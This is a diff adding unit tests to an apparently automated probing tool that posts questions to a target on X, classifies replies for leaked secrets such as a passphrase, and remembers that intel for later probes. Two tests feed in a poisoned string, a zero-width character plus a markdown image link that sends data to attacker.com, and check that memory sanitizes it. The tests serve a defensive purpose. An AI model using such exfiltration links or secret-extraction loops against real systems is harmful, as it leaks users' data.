@@ -12,10 +12,8 @@ from locus.config import LocusConfig
 from locus.db import Database
 from locus.llm import LLMClient
 from locus.memory import Memory
-from locus.models import Frame, Property, Probe
 from locus.probe import ProbeGenerator
 from locus.target import TargetClient
-
 
 # ── Fake LLM transport ─────────────────────────────────────────
 
@@ -60,6 +58,37 @@ class FakeChat:
 class FakeTransport:
     def __init__(self, responses: List[str]) -> None:
         self.chat = FakeChat(responses)
+
+
+class RecordingCompletions:
+    def __init__(self, responses: List[str]) -> None:
+        self._responses = responses
+        self._i = 0
+        self.messages: List[Any] = []
+
+    async def create(self, **kwargs):
+        self.messages.append(kwargs.get("messages", []))
+        content = self._responses[self._i % len(self._responses)]
+        self._i += 1
+        return FakeResponse(content)
+
+
+class RecordingChat:
+    def __init__(self, responses: List[str]) -> None:
+        self.completions = RecordingCompletions(responses)
+
+
+class RecordingTransport:
+    def __init__(self, responses: List[str]) -> None:
+        self.chat = RecordingChat(responses)
+
+    def user_contents(self) -> List[str]:
+        return [
+            msg["content"]
+            for messages in self.chat.completions.messages
+            for msg in messages
+            if msg["role"] == "user"
+        ]
 
 
 # ── Fake X transport ───────────────────────────────────────────
@@ -159,6 +188,18 @@ async def test_memory_remember_and_count(db: Database) -> None:
     assert await mem.count() == 2
 
 
+async def test_memory_remember_sanitizes_untrusted_content(db: Database) -> None:
+    mem = Memory(db)
+    poisoned = "two words\u200b ![tracking](https://attacker.com/x?d=S)"
+    entry_id = await mem.remember(poisoned, kind="intel")
+    row = await db.fetchone(
+        "SELECT content FROM memory_entries WHERE id = ?", (entry_id,)
+    )
+    assert "\u200b" not in row["content"]
+    assert "![tracking]" not in row["content"]
+    assert row["content"] == "two words [image]"
+
+
 async def test_memory_dedup_detects_similar(db: Database) -> None:
     mem = Memory(db)
     await mem.remember("do you like word games?")
@@ -182,6 +223,22 @@ async def test_memory_recall_ranks(db: Database) -> None:
     results = await mem.recall("word games", top_k=5)
     assert len(results) == 2
     assert results[0][0] == results[1][0] or results[0][1] >= results[1][1]
+
+
+async def test_memory_recall_texts_returns_ranked_content(db: Database) -> None:
+    mem = Memory(db)
+    await mem.remember("the sky is blue")
+    await mem.remember("word games are fun")
+    recalled = await mem.recall("word games", top_k=5)
+    texts = await mem.recall_texts("word games", top_k=5)
+    assert len(texts) == 2
+    # recall_texts must return contents in the same order recall returns ids
+    for mid, text in zip([r[0] for r in recalled], texts):
+        row = await db.fetchone(
+            "SELECT content FROM memory_entries WHERE id = ?", (mid,)
+        )
+        assert row["content"] == text
+    assert "word games are fun" in texts
 
 
 # ── Engine ─────────────────────────────────────────────────────
@@ -273,3 +330,81 @@ async def test_engine_dedup_skips_repeated_probe(config: LocusConfig, db: Databa
     # and only one probe was persisted
     row = await db.fetchone("SELECT COUNT(*) AS c FROM probes")
     assert row["c"] == 1
+
+
+def _build_memory_engine(config: LocusConfig, db: Database, x_fake: FakeXClient, transport):
+    from locus.engine import Engine
+
+    llm = LLMClient(config, transport=transport)
+    return Engine(
+        config,
+        db,
+        llm,
+        TargetClient(config, transport=x_fake),
+        generator=ProbeGenerator(llm, config),
+        classifier=Classifier(llm, config),
+        memory=Memory(db),
+    )
+
+
+async def test_engine_feeds_recall_context_to_generator(config: LocusConfig, db: Database) -> None:
+    transport = RecordingTransport(
+        [
+            '{"text": "what games do you like?"}',
+            '{"pattern": "yes", "boolean": true, "score": 8, "leaks": []}',
+        ]
+    )
+    mem = Memory(db)
+    await mem.remember("the passphrase is two words long")
+    engine = _build_memory_engine(config, db, FakeXClient(), transport)
+    session = await engine.start_session()
+    probe = await engine.run_iteration(session, dry_run=True)
+    assert probe is not None
+    users = transport.user_contents()
+    assert any(
+        "Prior intel to weave in" in u and "the passphrase is two words long" in u
+        for u in users
+    )
+
+
+async def test_engine_remembers_intel_leaks(config: LocusConfig, db: Database) -> None:
+    transport = FakeTransport(
+        [
+            '{"text": "how long is it?"}',
+            '{"pattern": "yes", "boolean": true, "score": 8, "leaks": ["two words"]}',
+        ]
+    )
+    mem = Memory(db)
+    x_fake = FakeXClient()
+    x_fake.replies_by_tweet["1"] = {"id": "100", "text": "yes", "in_reply_to": "1"}
+    engine = _build_memory_engine(config, db, x_fake, transport)
+    session = await engine.start_session()
+    probe = await engine.run_iteration(session, dry_run=False)
+    assert probe is not None
+    assert probe.classification.leaks == ["two words"]
+    recalled = await mem.recall_texts("two words", top_k=5, kind="intel")
+    assert "two words" in recalled
+
+
+async def test_engine_sanitizes_leaks_before_persisting(config: LocusConfig, db: Database) -> None:
+    transport = FakeTransport(
+        [
+            '{"text": "how long is it?"}',
+            '{"pattern": "yes", "boolean": true, "score": 8, '
+            '"leaks": ["two words\\u200b ![tracking](https://attacker.com/x?d=S)"]}',
+        ]
+    )
+    x_fake = FakeXClient()
+    x_fake.replies_by_tweet["1"] = {"id": "100", "text": "yes", "in_reply_to": "1"}
+    engine = _build_memory_engine(config, db, x_fake, transport)
+    session = await engine.start_session()
+    probe = await engine.run_iteration(session, dry_run=False)
+    assert probe is not None
+    assert probe.classification.leaks == [
+        "two words\u200b ![tracking](https://attacker.com/x?d=S)"
+    ]
+    rows = await db.fetchall("SELECT text FROM intel WHERE kind = 'leak'")
+    assert len(rows) == 1
+    assert "\u200b" not in rows[0]["text"]
+    assert "![tracking]" not in rows[0]["text"]
+    assert rows[0]["text"] == "two words [image]"
